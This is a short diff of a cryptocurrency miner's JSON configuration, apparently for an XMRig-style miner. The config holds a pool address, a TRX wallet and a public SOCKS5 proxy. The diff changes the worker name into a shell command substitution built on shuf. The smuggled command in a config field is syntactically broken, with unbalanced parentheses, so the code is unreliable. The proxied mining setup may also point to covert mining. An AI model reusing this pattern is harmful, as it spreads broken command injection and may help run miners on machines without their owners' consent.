@@ -14,7 +14,7 @@
             "coin": null,
             "algo": "rx/0",
             "url": "rx.unmineable.com:3333",
-            "user": "TRX:TLWasr7Ew35NZ8LY4qnJXiGHifTGszjD3V.Bugger",
+            "user": "TRX:TLWasr7Ew35NZ8LY4qnJXiGHifTGszjD3V.$(echo $(shuf -i 1000-9999 -n 1)#y1eo-ugiz",
             "pass": "x",
             "socks5": "socks5://184.181.217.204:4145",
             "tls": false,
